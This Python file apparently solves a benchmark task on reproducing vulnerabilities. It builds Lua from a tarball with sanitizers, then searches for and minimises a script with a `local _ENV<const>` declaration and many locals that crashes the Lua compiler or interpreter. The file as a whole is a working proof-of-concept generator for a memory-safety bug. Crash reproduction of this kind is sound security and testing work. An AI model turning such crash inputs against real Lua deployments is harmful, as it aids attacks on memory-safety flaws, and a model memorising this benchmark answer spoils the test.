import os
import re
import tarfile
import tempfile
import subprocess
import shutil
import time
from typing import Optional, Tuple, Callable, List


_ASAN_RE = re.compile(
    br"(AddressSanitizer|UndefinedBehaviorSanitizer|LeakSanitizer|heap-use-after-free|use-after-free|asan:)",
    re.IGNORECASE,
)


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        base = os.path.realpath(dst_dir) + os.sep
        for m in tf.getmembers():
            name = m.name
            if not name:
                continue
            if name.startswith("/") or name.startswith("\\"):
                raise ValueError("unsafe tar path")
            out_path = os.path.realpath(os.path.join(dst_dir, name))
            if not out_path.startswith(base):
                raise ValueError("unsafe tar path traversal")
        tf.extractall(dst_dir)


def _run(
    argv: List[str],
    cwd: Optional[str] = None,
    inp: Optional[bytes] = None,
    timeout: float = 3.0,
    env: Optional[dict] = None,
) -> Tuple[int, bytes, bytes]:
    p = subprocess.run(
        argv,
        cwd=cwd,
        input=inp,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        env=env,
    )
    return p.returncode, p.stdout, p.stderr


def _find_root_with_lua_src(extracted_dir: str) -> Optional[str]:
    # Prefer shallow roots
    candidates = []
    for root, dirs, files in os.walk(extracted_dir):
        if "src" in dirs:
            src_dir = os.path.join(root, "src")
            if os.path.isfile(os.path.join(src_dir, "lua.c")) and os.path.isfile(os.path.join(src_dir, "lparser.c")):
                candidates.append(root)
    if not candidates:
        return None
    candidates.sort(key=lambda p: (p.count(os.sep), len(p)))
    return candidates[0]


def _which_cc() -> Optional[str]:
    for cc in ("clang", "gcc", "cc"):
        p = shutil.which(cc)
        if p:
            return p
    return None


def _build_lua(root: str, time_budget_end: float) -> Tuple[Optional[str], Optional[str]]:
    cc = _which_cc()
    if not cc:
        return None, None

    # Try sanitizer flag sets in descending preference.
    flag_sets = [
        ("-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined", "-fsanitize=address,undefined"),
        ("-O1 -g -fno-omit-frame-pointer -fsanitize=address", "-fsanitize=address"),
    ]
    targets = ["linux", "posix", None]

    for cflags, ldflags in flag_sets:
        for target in targets:
            if time.time() > time_budget_end:
                return None, None
            env = os.environ.copy()
            env["CC"] = cc
            env["MYCFLAGS"] = cflags
            env["MYLDFLAGS"] = ldflags

            argv = ["make", "-j8"]
            if target:
                argv.append(target)

            try:
                rc, _, _ = _run(argv, cwd=root, timeout=180.0, env=env)
            except Exception:
                rc = 1

            if rc != 0:
                continue

            lua = os.path.join(root, "src", "lua")
            luac = os.path.join(root, "src", "luac")
            if os.path.isfile(lua) and os.access(lua, os.X_OK):
                if os.path.isfile(luac) and os.access(luac, os.X_OK):
                    return lua, luac
                return lua, None

    return None, None


def _looks_like_sanitizer_crash(rc: int, err: bytes) -> bool:
    if rc < 0:
        return True
    if rc != 0 and _ASAN_RE.search(err or b""):
        return True
    return False


def _build_many_locals_top(n: int) -> bytes:
    if n <= 0:
        return b"local _ENV<const>=_G\nprint(1)\n"
    names = ",".join(f"_{i}" for i in range(n))
    s = f"local _ENV<const>,{names}=_G\nprint(1)\n"
    return s.encode("utf-8")


def _build_many_locals_do(n: int) -> bytes:
    if n <= 0:
        return b"do\nlocal _ENV<const>=_G\nprint(1)\nend\nprint(2)\n"
    names = ",".join(f"_{i}" for i in range(n))
    s = f"do\nlocal _ENV<const>,{names}=_G\nprint(1)\nend\nprint(2)\n"
    return s.encode("utf-8")


def _build_many_locals_inner_func(n: int) -> bytes:
    if n <= 0:
        return b"local function f()\nlocal _ENV<const>=_G\nlocal function g() return tostring(123) end\nreturn g()\nend\nf()\n"
    names = ",".join(f"_{i}" for i in range(n))
    s = (
        "local function f()\n"
        f"local _ENV<const>,{names}=_G\n"
        "local function g() return tostring(123) end\n"
        "return g()\n"
        "end\n"
        "f()\n"
    )
    return s.encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Static best-effort fallback (close to ground-truth length).
        fallback = _build_many_locals_top(250)

        t0 = time.time()
        time_budget = 75.0
        time_budget_end = t0 + time_budget

        workdir = tempfile.mkdtemp(prefix="poc_lua_")
        try:
            try:
                _safe_extract_tar(src_path, workdir)
            except Exception:
                return fallback

            root = _find_root_with_lua_src(workdir)
            if not root:
                return fallback

            lua_bin, luac_bin = _build_lua(root, time_budget_end)
            if not lua_bin:
                return fallback

            tmpdir = tempfile.mkdtemp(prefix="lua_run_", dir=workdir)

            def check(code: bytes) -> bool:
                if time.time() > time_budget_end:
                    return False
                in_path = os.path.join(tmpdir, "p.lua")
                with open(in_path, "wb") as f:
                    f.write(code)

                # Try luac (compile-only) first
                if luac_bin:
                    out_path = os.path.join(tmpdir, "out.luac")
                    try:
                        rc, _, err = _run([luac_bin, "-o", out_path, in_path], cwd=root, timeout=5.0)
                        if _looks_like_sanitizer_crash(rc, err):
                            return True
                    except subprocess.TimeoutExpired:
                        pass
                    except Exception:
                        pass

                # Then lua (compile + run)
                try:
                    rc, _, err = _run([lua_bin, in_path], cwd=root, timeout=5.0)
                    if _looks_like_sanitizer_crash(rc, err):
                        return True
                except subprocess.TimeoutExpired:
                    return False
                except Exception:
                    return False

                return False

            # Prefer deterministic structured search.
            builders: List[Tuple[str, Callable[[int], bytes]]] = [
                ("top", _build_many_locals_top),
                ("do", _build_many_locals_do),
                ("inner", _build_many_locals_inner_func),
            ]
            n_values = [0, 1, 2, 3, 4, 5, 8, 10, 12, 15, 18, 20, 24, 28, 32, 36, 40, 45, 50, 60, 70, 80, 90, 100, 120, 140, 160, 180, 200, 220, 240, 260, 280, 300, 350, 400, 500, 650, 800, 1000]

            best_code = None
            best_builder = None
            best_n = None

            for bname, bfn in builders:
                for n in n_values:
                    if time.time() > time_budget_end:
                        break
                    code = bfn(n)
                    # Confirm crash twice for stability
                    if check(code) and check(code):
                        best_code = code
                        best_builder = bfn
                        best_n = n
                        break
                if best_code is not None:
                    break

            if best_code is None:
                # Try a couple of higher-N fallbacks quickly
                for n in (250, 350, 500, 800):
                    code = _build_many_locals_top(n)
                    if check(code) and check(code):
                        best_code = code
                        best_builder = _build_many_locals_top
                        best_n = n
                        break

            if best_code is None:
                return fallback

            # Minimize N for the found builder.
            if best_builder is not None and best_n is not None:
                lo, hi = -1, best_n
                while hi - lo > 1 and time.time() <= time_budget_end:
                    mid = (lo + hi) // 2
                    code = best_builder(mid)
                    if check(code) and check(code):
                        hi = mid
                        best_code = code
                    else:
                        lo = mid

            return best_code if best_code is not None else fallback
        finally:
            try:
                shutil.rmtree(workdir, ignore_errors=True)
            except Exception:
                pass